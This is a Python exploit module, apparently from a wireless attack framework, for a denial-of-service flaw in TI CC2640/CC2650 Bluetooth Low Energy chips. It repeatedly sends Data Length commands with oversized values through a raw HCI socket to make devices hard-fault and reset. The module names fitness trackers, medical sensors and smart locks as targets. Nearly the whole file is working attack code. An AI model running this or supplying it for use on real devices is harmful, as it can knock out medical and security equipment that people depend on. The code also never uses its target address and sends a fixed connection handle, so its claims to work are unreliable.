# Author: André Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """TI CC2640/CC2650 BLE Link Layer LL_LENGTH_REQ DoS (CVE-2025-44525).

    Texas Instruments CC2640 and CC2650 BLE System-on-Chip devices
    contain a vulnerability in the Link Layer handling of
    LL_LENGTH_REQ (Data Length Update Request) PDUs.  When a
    connected BLE central sends an LL_LENGTH_REQ with a MaxRxOctets
    or MaxTxOctets value exceeding the controller's buffer capacity,
    the TI BLE stack enters an undefined state and triggers a hard
    fault, causing the device to reset.  This affects a wide range
    of IoT devices: fitness trackers, medical sensors, smart locks,
    industrial sensors, and beacons using TI BLE chips.

    CVSS v3.1: 6.5 (Medium), AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "TI BLE LL_LENGTH_REQ Denial of Service (CVE-2025-44525)",
        "description": (
            "Exploits CVE-2025-44525 to crash TI CC2640/CC2650 BLE devices.  "
            "Sends an LL_LENGTH_REQ PDU with oversized MaxRxOctets/MaxTxOctets "
            "values that exceed the controller's buffer capacity, triggering "
            "a hard fault and device reset.  Affects IoT devices using TI "
            "BLE System-on-Chip: fitness trackers, medical sensors, smart "
            "locks, industrial sensors."
        ),
        "authors": (
            "Matheus E. Garbelini (discovery)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2025-44525",
            "https://www.ti.com/product/CC2640",
            "https://asset-group.github.io/disclosures/sweyntooth/",
        ),
        "disclosure_date": "2025-09-10",
        "platform": "embedded",
        "arch": "arm",
        "privileged": False,
        "targets": (
            "TI CC2640 BLE SoC (all firmware versions)",
            "TI CC2650 BLE SoC (all firmware versions)",
            "IoT devices with TI BLE stack",
        ),
    }

    target = OptIP("", "Target BLE device address (XX:XX:XX:XX:XX:XX)")
    port = OptPort(1, "Not used (BLE Link Layer)")
    timeout = OptFloat(10.0, "Connection timeout in seconds")
    interface = OptString("hci0", "Local HCI adapter")
    max_octets = OptInteger(65535, "Oversized MaxRxOctets/MaxTxOctets value")
    max_time = OptInteger(65535, "Oversized MaxRxTime/MaxTxTime value")
    repeat_count = OptInteger(8, "Number of LL_LENGTH_REQ PDUs to send")

    _AF_BLUETOOTH = 31
    _BTPROTO_HCI = 1

    _HCI_COMMAND_PKT = 0x01
    _OGF_LE = 0x08
    _OCF_LE_SET_DATA_LENGTH = 0x0022

    _LL_LENGTH_REQ_OPCODE = 0x14

    def _bd_addr_to_bytes(self, addr: str) -> bytes:
        parts = addr.split(":")
        return bytes(int(b, 16) for b in reversed(parts))

    def _build_le_set_data_length(self, handle: int) -> bytes:
        """Build HCI LE Set Data Length command with oversized values.

        This command causes the local controller to send an
        LL_LENGTH_REQ PDU to the remote device with the specified
        MaxTxOctets and MaxTxTime values.
        """
        opcode = (self._OGF_LE << 10) | self._OCF_LE_SET_DATA_LENGTH
        params = struct.pack("<HHH", handle,
                             self.max_octets & 0xFFFF,
                             self.max_time & 0xFFFF)
        return struct.pack("<BHB", self._HCI_COMMAND_PKT, opcode,
                           len(params)) + params

    def _build_ll_length_req_raw(self) -> bytes:
        """Build a raw LL_LENGTH_REQ PDU for direct injection."""
        opcode = self._LL_LENGTH_REQ_OPCODE
        max_rx_octets = self.max_octets & 0xFFFF
        max_rx_time = self.max_time & 0xFFFF
        max_tx_octets = self.max_octets & 0xFFFF
        max_tx_time = self.max_time & 0xFFFF

        return struct.pack("<BHHHH", opcode,
                           max_rx_octets, max_rx_time,
                           max_tx_octets, max_tx_time)

    def _open_hci_socket(self) -> socket.socket | None:
        try:
            sock = socket.socket(self._AF_BLUETOOTH, socket.SOCK_RAW,
                                 self._BTPROTO_HCI)
            sock.settimeout(self.timeout)
            dev_id = int(str(self.interface).replace("hci", "")) if str(
                self.interface).startswith("hci") else 0
            sock.bind((dev_id,))
            return sock
        except OSError:
            return None

    def _hci_send(self, packet: bytes) -> bool:
        try:
            sock = socket.socket(self._AF_BLUETOOTH, socket.SOCK_RAW,
                                 self._BTPROTO_HCI)
            sock.settimeout(self.timeout)
            dev_id = int(str(self.interface).replace("hci", "")) if str(
                self.interface).startswith("hci") else 0
            sock.bind((dev_id,))
            sock.send(packet)
            sock.close()
            return True
        except OSError:
            return False

    @mute
    def check(self) -> bool:
        sock = self._open_hci_socket()
        if sock is None:
            return False
        sock.close()
        return True

    def run(self) -> None:
        if not self.target:
            print_error("target is required (BLE address XX:XX:XX:XX:XX:XX)")
            return

        if not self.check():
            print_error(
                f"HCI adapter {self.interface} not available or "
                "insufficient privileges"
            )
            return

        print_success(
            f"HCI adapter {self.interface} available; targeting {self.target} "
            "with oversized LL_LENGTH_REQ"
        )
        self._exploit()

    def _exploit(self) -> None:
        handle = 0x0040

        print_status(
            f"Sending {self.repeat_count} LE Set Data Length commands "
            f"(MaxOctets={self.max_octets}, MaxTime={self.max_time})"
        )

        success = 0
        for i in range(self.repeat_count):
            cmd = self._build_le_set_data_length(handle)
            if self._hci_send(cmd):
                success += 1
            time.sleep(0.05)

        print_status(f"Sent {success}/{self.repeat_count} LL_LENGTH_REQ triggers")
        print_info(
            "If the target uses a TI CC2640/CC2650 BLE SoC, the oversized "
            f"MaxRxOctets/MaxTxOctets ({self.max_octets}) exceeds the "
            "controller's buffer capacity, triggering a hard fault.  "
            "The device should reset within seconds.  Repeated triggers "
            "create a persistent DoS condition."
        )
